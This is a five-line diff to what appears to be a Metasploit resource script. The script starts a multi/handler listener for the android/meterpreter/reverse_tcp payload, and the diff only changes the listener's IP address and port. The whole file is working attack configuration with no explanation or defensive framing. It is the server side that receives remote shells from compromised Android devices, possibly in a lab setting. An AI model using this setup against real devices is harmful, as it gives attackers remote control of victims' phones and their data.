@@ -1,5 +1,5 @@
 use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
-set lhost 10.9.163.154
-set lport 4343
+set lhost 10.9.227.74
+set lport 4549
 exploit
